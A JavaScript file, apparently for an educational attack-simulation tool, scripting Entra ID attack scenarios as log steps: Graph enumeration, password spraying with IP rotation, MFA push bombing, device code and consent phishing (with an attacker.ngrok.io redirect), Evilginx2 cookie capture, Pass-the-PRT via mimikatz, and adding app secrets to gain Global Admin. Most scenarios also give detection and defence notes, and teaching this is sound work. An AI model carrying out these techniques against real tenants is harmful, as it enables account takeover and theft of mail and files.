import { highlightElement, addTemporaryEdge } from '../graph.js';
import { stepDelay } from '../state.js';

// ══════════════════════════════════════════════════════════════════
//  ENUMERATION & DISCOVERY
// ══════════════════════════════════════════════════════════════════

// ── 1. AzureHound / BloodHound for Entra ID ──────────────────────
export const entraAzureHoundScenario = [
  {
    scenarioName: "Attack: AzureHound / BloodHound Enumeration (Entra ID)",
    logMessage: "Attacker Goal: Map Entra ID attack paths using BloodHound/AzureHound. Any valid tenant user credential is sufficient — MS Graph API read access is granted to all members by default.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has Alice's compromised credentials (alice@corp.onmicrosoft.com). Low-privilege — no admin role required.",
    logType: "info",
    action: () => highlightElement("ent_user1", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker: POST /oauth2/v2.0/token { grant_type=password, username=alice@corp, password=<cracked>, scope=https://graph.microsoft.com/.default }. ROPC flow — authenticates headlessly without browser, bypasses interactive CA policies.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "ROPC auth (alice)"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token (JWT, 1h, scp=User.Read+Directory.Read.All), refresh_token (14d) }. MS Graph token issued for Alice.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "MS Graph token"),
  },
  {
    logMessage: "AzureHound: GET https://graph.microsoft.com/v1.0/users?$select=id,userPrincipalName,accountEnabled,userType,onPremisesSyncEnabled&$top=999 (paginated). Full tenant user dump — 340 objects.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /users (all)"),
  },
  {
    logMessage: "AzureHound: GET /v1.0/groups?$top=999. GET /v1.0/groups/{id}/members for each group. Maps complete group membership relationships across tenant.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /groups+members"),
  },
  {
    logMessage: "AzureHound: GET /beta/roleManagement/directory/roleAssignments?$expand=principal&$top=999. Returns all active + PIM-eligible Entra role assignments. Finds: EntraAdmin has GlobalAdministrator eligible, AppReg-01 SP has RoleManagement.ReadWrite.Directory app role.",
    logType: "msgraph",
    action: () => { highlightElement("ent_admin"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /roleAssignments"); },
  },
  {
    logMessage: "AzureHound: GET /v1.0/applications?$select=appId,displayName,keyCredentials,passwordCredentials,requiredResourceAccess&$top=999. GET /v1.0/servicePrincipals?$expand=appRoleAssignments. Exposes all registered apps, their secrets/cert thumbprints, and granted MS Graph application permissions.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /applications+SPs"); },
  },
  {
    logMessage: "AzureHound: GET /beta/identity/conditionalAccessPolicies. Parses all CA policies — conditions, exclusions, control gaps. Finds: legacy auth (Exchange ActiveSync) not blocked, breakglass account excluded from all policies.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /conditionalAccess"),
  },
  {
    logMessage: "BloodHound ingests JSON. Attack path identified: Alice → member of 'App-Owners-Prod' group → Owner on AppReg-01 → AppReg-01 has Application Permission RoleManagement.ReadWrite.Directory → can assign Global Admin to any principal.",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_user1"); highlightElement("ent_admin"); },
  },
  {
    logMessage: "IMPACT: Full tenant object map obtained via read-only Graph API. Attack paths to Global Admin, over-permissioned service principals, CA policy gaps, and stale credential-bearing apps identified — zero alerts generated (all legitimate read operations).",
    logType: "success",
    action: () => highlightElement("ent_tenant"),
  },
];

// ── 2. Graph API Targeted Recon (ROADtools / GraphRunner) ────────
export const entraGraphEnumScenario = [
  {
    scenarioName: "Attack: Graph API Targeted Recon (ROADtools / GraphRunner)",
    logMessage: "Attacker Goal: Precision recon via MS Graph — find over-privileged apps, accounts without MFA, stale credentials, and CA policy gaps. Tools: ROADtools, GraphRunner (PowerShell), TokenTactics.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker: roadrecon auth --client-id 1950a258-227b-4e31-a9cf-717495945fc2 (Microsoft Azure PowerShell — natively trusted, high Graph permissions). PKCE device code — no app registration in target tenant needed.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "auth (AzurePowerShell)"),
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/applications?$select=appId,displayName,passwordCredentials,keyCredentials&$top=999. Lists ALL app registrations + their client secret metadata: keyId, hint, endDateTime. Stale secrets (endDateTime far future) indicate long-term backdoor candidates.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /applications"); },
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/servicePrincipals?$filter=appRoleAssignmentRequired eq false&$select=appId,displayName,appRoles,oauth2PermissionScopes. Finds SPs with 'RoleManagement.ReadWrite.Directory' or 'AppRoleAssignment.ReadWrite.All' application permissions — direct privilege escalation primitives.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /servicePrincipals"),
  },
  {
    logMessage: "Attacker → MS Graph: GET /beta/users?$select=userPrincipalName,strongAuthenticationDetail,authorizationInfo&$top=999. Identifies accounts with no MFA registration (authenticationMethods absent) — viable spray/phishing targets without MFA friction.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /users (MFA gaps)"),
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/directoryRoles?$expand=members. GET /beta/privilegedAccess/aadRoles/resources/{tid}/roleAssignments?$filter=assignmentState eq 'Eligible'. Enumerates standing admins + PIM-eligible accounts — high-value compromise targets.",
    logType: "msgraph",
    action: () => { highlightElement("ent_admin"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /directoryRoles"); },
  },
  {
    logMessage: "Attacker → MS Graph: GET /v1.0/groups/{GlobalAdminGroupId}/members. Result: 'svc-backup@corp.onmicrosoft.com' is a direct member of Global Administrators group — service account, no MFA registered, no CA exclusion.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /groups/GA/members"),
  },
  {
    logMessage: "Attacker → MS Graph: GET /beta/identity/conditionalAccessPolicies (requires Policy.Read.All, granted via AzurePowerShell token). Policy 'Block legacy auth' has exclusion: onPremisesUserPrincipalName ENDSWITH 'svc-backup'. Legacy auth unblocked for this account.",
    logType: "msgraph",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Recon complete — ROADtools DB built locally. Target identified: svc-backup@corp (Global Admin member, no MFA, legacy auth unblocked) + AppReg-01 (RoleManagement.ReadWrite.Directory app permission, two secrets with 2027 expiry). Multiple high-confidence attack paths, all via silent read-only API calls.",
    logType: "success",
    action: () => { highlightElement("ent_admin"); highlightElement("ent_svc"); },
  },
];

// ══════════════════════════════════════════════════════════════════
//  INITIAL ACCESS & CREDENTIAL ATTACKS
// ══════════════════════════════════════════════════════════════════

// ── 3. Password Spray (Entra Smart Lockout aware) ─────────────────
export const entraPasswordSprayScenario = [
  {
    scenarioName: "Attack: Password Spray — Entra ID (Smart Lockout Evasion)",
    logMessage: "Attacker Goal: Identify valid credentials by spraying one password per lockout window across all harvested UPNs. Entra Smart Lockout: 10 failed attempts per 60s per source IP before soft lockout.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker: 340 UPNs collected via AzureHound + LinkedIn OSINT (firstname.lastname@corp.onmicrosoft.com naming convention confirmed). Password candidates: 'Spring2024!', 'Corp2024!', 'Welcome1'. Tool: CredMaster / MSOLSpray with IP rotation per request.",
    logType: "info",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker: POST https://login.microsoftonline.com/{tenantId}/oauth2/v2.0/token { grant_type=password, username=bob@corp, password=Spring2024!, client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c (Office desktop client — common, trusted) }. Rotating VPS IPs per request.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "spray (bob, ip1)"),
  },
  {
    logMessage: "Entra ID → Attacker: 400 { error: 'invalid_grant', error_codes: [50126], error_description: 'AADSTS50126: Invalid credentials' }. Smart Lockout counter: bob@corp = 1/10. IP1 counter: 1/10.",
    logType: "fail",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "50126 invalid_grant"),
  },
  {
    logMessage: "Attacker sprays next 9 accounts from IP1, switches to IP2, continues. After 100 accounts across 10 IPs, waits 65 seconds to reset all per-IP lockout windows before next spray wave. Per-account counter never reaches threshold.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "spray batch (100 accts)"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token, refresh_token, token_type: Bearer, scope } — alice@corp:Spring2024! valid. ROPC flow bypasses interactive CA policies including MFA requirements (legacy auth path). Smart Lockout not triggered due to IP rotation.",
    logType: "success",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "200 OK (alice)"); },
  },
  {
    logMessage: "Entra Sign-In Log: Auth method 'Password', MFA: None, Client app: 'Other clients' (ROPC). Identity Protection risk: None if IP is clean VPS. Defender for Identity: no alert (no on-prem traffic). Gap: CA policy 'Block legacy auth' would have prevented this — ROPC is a legacy auth flow.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Valid credentials obtained (alice@corp:Spring2024!) via legacy auth — bypassed all interactive CA policies. Attacker holds access_token (1h) + refresh_token (14d). Root cause: CA policy missing 'Block legacy authentication' control for all users.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 4. MFA Fatigue / Authenticator Push Bombing ──────────────────
export const entraMFAFatigueScenario = [
  {
    scenarioName: "Attack: MFA Fatigue — Authenticator Push Bombing",
    logMessage: "Attacker Goal: Defeat MFA by overwhelming the victim with repeated Authenticator push notifications until an accidental approval. Requires valid password. Exploits absence of number matching.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has Alice's password from spray. CA policy mandates MFA for all sign-ins but Authenticator push is configured as 'Approve/Deny' only — no number matching, no additional context displayed in the push notification.",
    logType: "info",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_attacker"); },
  },
  {
    logMessage: "Attacker → Entra ID: POST /oauth2/v2.0/authorize → POST /login (alice@corp + password). Credentials valid. CA: MFA required. Entra dispatches Authenticator push notification to Alice's registered device (LAPTOP-01 / her phone).",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "auth + pwd valid"),
  },
  {
    logMessage: "Entra ID → Alice's device: Push #1 — 'Are you trying to sign in? Approve / Deny'. No app name, no location, no number. Alice dismisses. Attacker immediately cancels and re-initiates authentication to trigger another push.",
    logType: "prt",
    action: () => { highlightElement("ent_dev1"); addTemporaryEdge("ent_tenant", "ent_dev1", "prt", "push #1 (denied)"); },
  },
  {
    logMessage: "Attacker loops authentication: Push #2 at 02:14, #3 at 02:15, #4 at 02:16... Sustained over 25 minutes, targeting late-night when Alice is likely asleep. Each denial = another immediate re-auth attempt. 17 pushes dispatched.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_tenant", "ent_dev1", "prt", "push x17 (denied)"),
  },
  {
    logMessage: "Alice, woken by repeated phone buzzing at 02:47, half-asleep taps 'Approve' on Push #17. Entra ID: MFA claim satisfied (amr: [pwd, mfa]). Authorization code issued to attacker's browser session.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_dev1", "ent_tenant", "prt", "push #17 APPROVED"); },
  },
  {
    logMessage: "Entra ID → Attacker: { access_token (1h), refresh_token (14d), id_token (alice@corp, oid) }. Full session established. All subsequent token requests use refresh_token — no further MFA prompts for 14 days.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "tokens (alice, 14d)"),
  },
  {
    logMessage: "DETECTION / PREVENTION: Enable 'Number Matching' in Authenticator policy — app displays a 2-digit code user must type, blocking blind approvals. 'Additional context' — shows app name + geographic location in push. Microsoft enforced number matching as default in May 2023. Also: sign-in frequency CA policy (max 1h session) limits refresh_token lifespan.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: MFA fully bypassed via social engineering. No technical exploit. Attacker has 14-day refresh token satisfying all CA controls. Root cause: push notification without context = no signal to distinguish legitimate vs. attacker-initiated prompts.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 5. Device Code Phishing (OAuth2 Device Authorization Grant) ──
export const entraDeviceCodePhishingScenario = [
  {
    scenarioName: "Attack: Device Code Phishing (OAuth2 Device Authorization Grant Abuse)",
    logMessage: "Attacker Goal: Steal Entra tokens by abusing the OAuth2 device authorization grant flow. Victim authenticates in their own browser on their own device — attacker collects the resulting tokens. No malware required.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker: POST https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/devicecode { client_id: d3590ed6-52b3-4102-aeff-aad2292ab01c (Microsoft Office — pre-trusted), scope: openid profile offline_access https://graph.microsoft.com/.default }.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "GET device_code"),
  },
  {
    logMessage: "Entra ID → Attacker: { device_code: 'BAAEAAAA...', user_code: 'ABCD-1234', verification_uri: 'https://microsoft.com/devicelogin', expires_in: 900, interval: 5 }. Attacker begins polling POST /token every 5 seconds.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "device_code + user_code"),
  },
  {
    logMessage: "Attacker → Alice (spear phish email): 'URGENT: Your Microsoft 365 license renewal requires verification. Visit https://microsoft.com/devicelogin and enter code ABCD-1234.' Uses legitimate Microsoft domain — no spoofing, passes link scanners.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
  {
    logMessage: "Alice opens https://microsoft.com/devicelogin on LAPTOP-01 (ent_dev1). Enters 'ABCD-1234'. Entra ID prompts full authentication: credentials + MFA push. Alice completes normally — she sees a real Microsoft login page, real MFA prompt. No phishing indicators.",
    logType: "prt",
    action: () => addTemporaryEdge("ent_dev1", "ent_tenant", "prt", "user authenticates"),
  },
  {
    logMessage: "Entra ID: Links Alice's completed auth session to the device_code. Attacker's next poll: POST /token { grant_type=urn:ietf:params:oauth:grant-type:device_code, device_code=<BAAEAAAA...> } → 200 OK { access_token (MS Graph, 1h), refresh_token (offline_access, 90d), id_token }.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "tokens (alice, 90d)"); },
  },
  {
    logMessage: "Attacker: refresh_token has offline_access scope — valid 90 days or until revoked, survives password changes. POST /token { grant_type=refresh_token } silently issues fresh access_tokens hourly. Accesses MS Graph: /me, /me/messages, /users, /directoryRoles, /applications.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /me, /users (90d)"),
  },
  {
    logMessage: "DETECTION: Entra Sign-In logs: Auth method 'Device code flow', unusual location/IP. Identity Protection: 'Unfamiliar sign-in properties'. BLOCK: CA policy targeting 'Filter for devices → device code flow' or 'Require compliant device' — blocks ROPC/device_code for non-managed devices.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Full MS Graph token acquired without attacker touching victim's device. Bypasses all CA policies (victim auth came from their compliant device). Refresh token valid 90 days — survives password reset (token not revoked until explicit session revocation or password change with revoke flag). Works against any tenant with device_code flow permitted.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 6. AITM via Evilginx2 ─────────────────────────────────────────
export const entraAITMScenario = [
  {
    scenarioName: "Attack: Adversary-in-the-Middle (AITM) — Evilginx2 Token Capture",
    logMessage: "Attacker Goal: Capture Entra ID session cookies and tokens via reverse-proxy AITM — full MFA bypass by sitting between victim and Entra ID, intercepting the post-MFA authenticated session.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker deploys Evilginx2 on VPS. Phishlet targets login.microsoftonline.com. Attacker domain: 'login.m1crosoft-corp.com' (typosquat). Valid Let's Encrypt TLS cert issued. Phishlet capture config: cookies=[ESTSAUTH, ESTSAUTHPERSISTENT, x-ms-RefreshTokenCredential]. All traffic bidirectionally proxied.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker → Alice (spear phish): 'Your Entra ID token requires re-authentication.' Link: https://login.m1crosoft-corp.com/corp.onmicrosoft.com/oauth2/v2.0/authorize?... Browser shows valid HTTPS padlock — real TLS cert on attacker domain. No browser warnings.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
  {
    logMessage: "Alice → Evilginx2 proxy → real login.microsoftonline.com. Proxy transparently forwards all requests/responses. Alice sees genuine Entra login UI served through the proxy. Enters credentials + approves MFA push (real prompts, real Authenticator notification).",
    logType: "http",
    action: () => { addTemporaryEdge("ent_user1", "ent_attacker", "http", "→ AITM proxy"); addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "forwarded auth"); },
  },
  {
    logMessage: "Entra ID: Auth complete. Issues session cookies to 'Alice's browser' (actually Evilginx2). Evilginx2 intercepts Set-Cookie headers before forwarding to victim: captures ESTSAUTH (current session JWT, ~1h), ESTSAUTHPERSISTENT (persistent session, up to 90d), x-ms-RefreshTokenCredential.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "ESTS cookies captured"),
  },
  {
    logMessage: "Attacker imports ESTSAUTH + ESTSAUTHPERSISTENT into browser via Cookie-Editor extension. Navigates to portal.azure.com, outlook.office.com, teams.microsoft.com — fully authenticated as Alice. Session cookie IS the session — no token exchange needed.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); highlightElement("ent_m365"); addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "cookie replay (ESTS)"); },
  },
  {
    logMessage: "Attacker: Uses session cookie context to silently acquire OAuth2 tokens — POST /oauth2/v2.0/token (cookie-based auth) → access_token (MS Graph, 1h) + refresh_token. Now has both browser session AND API-level access. Entra sees requests matching Alice's session fingerprint — no anomaly triggered.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "token extract (cookie)"),
  },
  {
    logMessage: "DETECTION: Entra ID P2 'Token anomaly' risk event: access_token presented from different IP/device than issuance. CAE (Continuous Access Evaluation) can revoke tokens in near-real-time if IP change is significant. ESTSAUTHPERSISTENT from matching geolocation VPS may evade both. Sign-in risk: 'Anomalous token' detection available in P2.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Full MFA bypass — victim completed real MFA but attacker captured the post-MFA session. ESTSAUTHPERSISTENT valid up to 90 days. Both browser and API access captured simultaneously. Works against any Entra tenant — no tenant-side configuration required. Phishing-resistant MFA (FIDO2/WHfB) is the only reliable defense: these credentials are device-bound and cannot be proxied.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  TOKEN & SESSION ATTACKS
// ══════════════════════════════════════════════════════════════════

// ── 7. Pass-the-PRT ──────────────────────────────────────────────
export const entraPassThePRTScenario = [
  {
    scenarioName: "Attack: Pass-the-PRT (Primary Refresh Token Theft)",
    logMessage: "Attacker Goal: Extract PRT from LSASS on a compromised Entra-joined device and replay it from an attacker machine to acquire tokens that carry full device compliance + MFA claims, bypassing all Conditional Access controls.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has SYSTEM on LAPTOP-01 (ent_dev1) — Alice's Entra-joined, Intune-compliant, WHfB-enrolled device. Device does NOT have CloudAP lockdown (Credential Guard for cloud credentials) enabled.",
    logType: "setup",
    action: () => highlightElement("ent_dev1", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker (SYSTEM on LAPTOP-01): mimikatz 'token::elevate' + 'sekurlsa::cloudap' → reads CloudAP cache from LSASS. PRT blob present (encrypted with device transport key). Session key wrapped with TPM transport key — TPM-sealed, not directly extractable.",
    logType: "attack",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "TPM blocks session key extraction: WHfB private key and session key decryption key live in TPM 2.0 hardware — TPM2_RSA_Decrypt requires local TPM authorization. Attacker pivots to live PRT cookie technique: sign a nonce with session key WHILE STILL on the device (TPM will execute signing for any SYSTEM process).",
    logType: "tpm",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Attacker: ROADtoken / AADInternals: Get-AADIntUserPRTToken → calls CloudAP COM interface (ICloudAPCredentialProvider) to construct and sign a PRT cookie (JWT with session key HMAC over server nonce). Returns x-ms-RefreshTokenCredential header value valid for ~60s.",
    logType: "prt",
    action: () => highlightElement("ent_dev1"),
  },
  {
    logMessage: "Attacker exfiltrates signed PRT cookie. Replays via Chrome DevTools Protocol on attacker machine: inject x-ms-RefreshTokenCredential header into request to login.microsoftonline.com/common/oauth2/v2.0/token. PRT cookie is time-bound but can be re-signed repeatedly while SYSTEM persists on device.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_dev1", "ent_attacker", "prt", "PRT cookie exfil"),
  },
  {
    logMessage: "Attacker → Entra ID: POST /oauth2/v2.0/token with x-ms-RefreshTokenCredential: <signed_PRT_cookie>. Entra ID: validates PRT reference, verifies session key HMAC over nonce, confirms device_id binding (LAPTOP-01, Intune-compliant).",
    logType: "prt",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "prt", "PRT cookie replay"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token (1h, amr=ngcmfa, deviceid=LAPTOP-01, intuneMDMCompliant=true), refresh_token (14d) }. Token carries Alice's full WHfB MFA + device compliance claims. ALL CA policies satisfied — attacker bypasses every conditional access control.",
    logType: "oidc",
    action: () => { highlightElement("ent_user1", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "tokens (ngcmfa + compliant)"); },
  },
  {
    logMessage: "Attacker: Accesses SharePoint, Exchange, Teams, Azure portal — all CA checks pass (compliant device_id in token, ngcmfa amr). Even policies requiring 'require compliant device' or 'require MFA' satisfied by stolen token claims.",
    logType: "msgraph",
    action: () => { highlightElement("ent_m365"); addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "full M365 access"); },
  },
  {
    logMessage: "DEFENSE: Microsoft Entra Proof of Possession (PoP) tokens (preview) — binds token to device asymmetric key. Attacker machine lacks LAPTOP-01's TPM key and cannot sign PoP challenges. Also: Continuous Access Evaluation (CAE) with IP location enforcement revokes tokens on IP change. Neither widely deployed by default.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Hardest Entra attack — requires initial device compromise. Reward: tokens inheriting all CA compliance claims of the victim's enrolled device. 14-day refresh token gives continuous access. Identical post-auth state to a legitimate WHfB sign-in from LAPTOP-01.",
    logType: "attack",
    action: () => highlightElement("ent_user1"),
  },
];

// ── 8. Consent Phishing ──────────────────────────────────────────
export const entraConsentPhishingScenario = [
  {
    scenarioName: "Attack: Consent Phishing — Malicious OAuth2 App Registration",
    logMessage: "Attacker Goal: Gain persistent delegated access to victim M365 data by tricking an admin into granting OAuth2 consent to a malicious app requesting high-privilege MS Graph permissions.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker pre-stages: registers malicious app in separate attacker-controlled Entra tenant. App config: displayName='M365 License Compliance Tool', logoUrl=Microsoft-branded icon. Requested delegated permissions: Mail.ReadWrite, Files.ReadWrite.All, User.Read, offline_access. Redirect URI: https://attacker.ngrok.io/callback.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Attacker sends spear phish to EntraAdmin: 'Microsoft Compliance: You must authorize the M365 License Compliance Tool to avoid service interruption.' Link: https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/authorize?client_id=<malicious>&scope=Mail.ReadWrite+Files.ReadWrite.All+offline_access&response_type=code&redirect_uri=...",
    logType: "attack",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "EntraAdmin clicks → Entra ID renders consent prompt: 'M365 License Compliance Tool wants to: Read and write your mail, Read and write your files.' Admin clicks 'Accept on behalf of your organization' — grants tenant-wide admin consent for ALL users.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_admin", "ent_tenant", "oidc", "admin consent (org-wide)"),
  },
  {
    logMessage: "Entra ID: oauth2PermissionGrant created for entire tenant (consentType=AllPrincipals). Authorization code delivered to attacker redirect URI. POST /token → { access_token (1h, Mail.ReadWrite scp for admin), refresh_token (offline_access, 90d) }.",
    logType: "oidc",
    action: () => { highlightElement("ent_admin", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "auth_code → tokens"); },
  },
  {
    logMessage: "Admin consent with AllPrincipals: attacker can acquire delegated tokens for ANY user by impersonating them via on-behalf-of flow. GET /v1.0/users/{alice_id}/messages (as Alice), GET /v1.0/users/{bob_id}/drive/root/children (as Bob). Mail + files of all 340 users accessible.",
    logType: "attack",
    action: () => { highlightElement("ent_user1"); highlightElement("ent_user2"); },
  },
  {
    logMessage: "Attacker: refresh_token survives Alice's password change. Silently re-issues access_token every hour via POST /token { grant_type=refresh_token }. Reads/forwards all mail to exfil mailbox. Zero user interaction after initial admin consent.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_m365", "msgraph", "mail + file exfil (all)"),
  },
  {
    logMessage: "DETECTION: Entra 'Risky OAuth apps' (App Governance / Defender for Cloud Apps): unknown publisher + dangerous permission combination flagged. Admin consent workflow feature: forces approval ticket before consent granted — breaks direct consent chain. Audit Log: 'Consent to application' + 'Add delegated permission grant' events.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Persistent token-based access independent of passwords. Survives password resets, MFA changes, CA policy updates. Admin consent elevates to all current + future tenant users. App persists in Enterprise Applications until explicitly removed. Classic 'illicit consent grant' — Microsoft Incident Response's most common IR finding.",
    logType: "attack",
    action: () => highlightElement("ent_svc"),
  },
];

// ══════════════════════════════════════════════════════════════════
//  PRIVILEGE ESCALATION
// ══════════════════════════════════════════════════════════════════

// ── 9. Add Credentials to App Registration ───────────────────────
export const entraAppCredAbuseScenario = [
  {
    scenarioName: "Attack: Add Credentials to App Registration (Service Principal Backdoor)",
    logMessage: "Attacker Goal: Add a new client secret to a high-privilege app registration, then authenticate as that service principal to perform privileged directory operations — no user account required, no MFA.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker has compromised EntraAdmin session (token with Application Administrator or higher role). Target: AppReg-01 (ent_svc) has Application Permission 'RoleManagement.ReadWrite.Directory' — can assign any Entra role to any principal.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", stepDelay, "compromised"); highlightElement("ent_svc"); },
  },
  {
    logMessage: "Attacker → MS Graph (as EntraAdmin): POST /v1.0/applications/{appReg01_objectId}/addPassword { passwordCredential: { displayName: 'sync-svc-2024', endDateTime: '2027-12-31T00:00:00Z' } }. Adds new client secret — existing secrets untouched, app functionality uninterrupted.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /applications/addPassword"),
  },
  {
    logMessage: "MS Graph → Attacker: 200 OK { keyId: 'f3a9...', hint: 'syn', secretText: 'Abc8Q~xyz...28b' }. secretText returned ONLY at creation time — never retrievable via Graph again. Attacker stores it. App now has two valid secrets: original (owners unaware) + new backdoor.",
    logType: "attack",
    action: () => highlightElement("ent_svc", stepDelay, "compromised"),
  },
  {
    logMessage: "Attacker → Entra ID: POST /oauth2/v2.0/token { grant_type=client_credentials, client_id=<AppReg-01_appId>, client_secret=<new_backdoor_secret>, scope=https://graph.microsoft.com/.default }. Application-context authentication — no user, no MFA, no CA interactive policy.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "client_credentials (SP)"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token (JWT, 1h, roles=[RoleManagement.ReadWrite.Directory], oid=<AppReg-01 SP>, appid, tid) }. Application permission token — roles claim contains app roles granted, not user wids. Silently refreshable every hour indefinitely.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP access_token (app roles)"),
  },
  {
    logMessage: "Attacker → MS Graph (as AppReg-01 SP): POST /v1.0/roleManagement/directory/roleAssignments { principalId: <attacker_new_SP_objectId>, roleDefinitionId: '62e90394-69f5-4237-9190-012177145e10' (GlobalAdministrator), directoryScopeId: '/' }. Permanent standing GA assignment — bypasses PIM entirely.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /roleAssignments (GA)"),
  },
  {
    logMessage: "Entra ID: Role assignment created. Attacker-controlled service principal is now a standing Global Administrator. Issues new client_credentials token — 'wids' claim now includes GA GUID '62e90394-...'. Full tenant admin without any user account.",
    logType: "attack",
    action: () => { highlightElement("ent_tenant", stepDelay, "compromised"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "GA token (wids)"); },
